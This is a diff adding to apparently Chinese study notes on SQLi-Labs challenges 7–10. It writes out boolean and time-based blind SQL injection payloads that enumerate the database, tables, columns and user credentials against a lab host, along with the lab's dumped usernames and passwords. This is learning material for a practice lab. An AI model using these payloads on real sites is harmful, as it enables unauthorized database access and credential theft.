@@ -134,6 +134,35 @@ http://172.16.104.130:7766/Less-7/?id=1')) and 1=1 跟 1=2 ，会有正确或错
 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";	
 ```
 
+```sql
+// 判断库名长度  使用Burp Suite爆破，步长1,循环判断长度
+and (length(database() = 8)); --+
+// 判断库名  使用Burp Suite爆破，步长1，循环判断字符内容。
+and (substr(database(),1,1)='a'); --+
+// 结果： security
+// 判断表名长度
+and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+
+// 爆破表名
+and (substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1 ) = 'a') --+
+// 结果：emails,referers,uagents,users
+// 爆破user表列名
+and (substr( (select column_name from information_schema.columns where table_name="users" limit 0,1),1,1 )='a'); --+
+// 结果： id,username,password
+// 爆破user数据
+and (substr( (select username from users limit 0,1),1,1 ) = 'a');--+
+and (substr( (select password from users limit 0,1),1,1 ) = 'a');--+
+/* 
+结果： name： 
+Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
+*/
+/*
+结果： password：
+Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+*/
+```
+
+
+
 
 
 
@@ -142,7 +171,44 @@ $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 
 无论成功，还是失败，返回的内容都是一样的，绝望。。。只能使用最蠢的时间。
 
+```sql
+// 判断库名  使用Burp Suite爆破，步长1，根据响应返回结果长度筛选
+and if( substr(database(),1,1), sleep(5), 1); --+	
+// 爆破表名 
+and if( substr( (select group_concat(table_name) from information_schema.tables where table_schema=database() ),1,1)='e',sleep(5),1); --+
+// 结果：emails,referers,uagents,users
+// 爆破users列名
+and if( substr( (select group_concat(column_name) from information_schema.columns where table_name="users"),1,1)='i', sleep(5),1); --+
+// 结果： id,username,password
+// 爆破users数据
+and if( substr( (select group_concat(username) from security.users),1,1)='d',sleep(5),1); --+
+and if( substr( (select group_concat(password) from security.users),1,1)='d',sleep(5),1); --+
+/* 
+结果： name： 
+Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
+*/
+/*
+结果： password：
+Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+*/
+```
+
 
 
 ##### 10. Blind - Time Based - Double Quote
+
+这种引号的使用方式，是真的太骚了。
+
+**ps：**需要补一下php的编码格式，这里是等于输入`""`指定id
+
+```php
+$id = '"'.$id.'"';
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+```
+
+```sql
+/Less-10/?id=1" and if(1=1,sleep(5),1); --+
+```
+
+
 
